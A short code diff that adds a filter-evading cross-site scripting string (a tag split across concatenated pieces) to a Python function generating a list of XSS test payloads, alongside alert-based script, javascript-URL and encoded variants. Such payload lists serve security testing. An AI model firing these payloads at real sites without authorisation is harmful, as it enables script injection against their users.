@@ -9,9 +9,14 @@ def generate_payload():
         ",".join(str(ord(c)) for c in "XSS") + "));</script>"
     )
     
+    evasion_payload_2 = (
+        '<scr' + 'ipt>alert(String.f' + 'romCharCode(88,83,83))</scr' + 'ipt>'
+    )
+    
     payloads = [
         base_payload,
         evasion_payload,
+        evasion_payload_2,
         "'';!--\"<XSS>=&{()};",
         "javascript:alert(1)",
         "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
